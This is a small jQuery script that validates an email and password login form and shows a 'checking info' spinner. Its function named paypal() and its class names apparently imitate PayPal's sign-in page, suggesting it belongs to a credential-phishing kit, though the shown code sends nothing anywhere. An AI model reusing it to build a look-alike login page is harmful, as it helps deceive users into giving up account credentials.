$(document).ready(function () {
    $("#bntlogin").click(function () {
        return paypal();
    });
    $("#EmailID").keyup(function(){
    	if($(this).val()!=''){
    		document.getElementById("mail").className="textInput";
    	}
    });
    $("#PasswordID").keyup(function(){
    	if($(this).val()!=''){
    		document.getElementById("pass").className="textInput";
    	}
    });
});
function paypal() {
    var email = $("#EmailID").val();
    var password = $("#PasswordID").val();
    var start;
    if(!validateEmail(email) || email ==''){
    	start = false;
    	document.getElementById("mail").className="textInput hasError";
    }
    if(password == ''){
    	start = false;
    	document.getElementById("pass").className="textInput hasError";
    }
    if(start==false){
    	return false;
    }
	else{
		document.getElementById("Done1").className = "transitioning spinner";
        document.getElementById("Done2").className = "checkingInfo show";
	}
    return true;
}
$(document).ready(function () {
    
})
function validateEmail(email) {
    var re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test(email);
}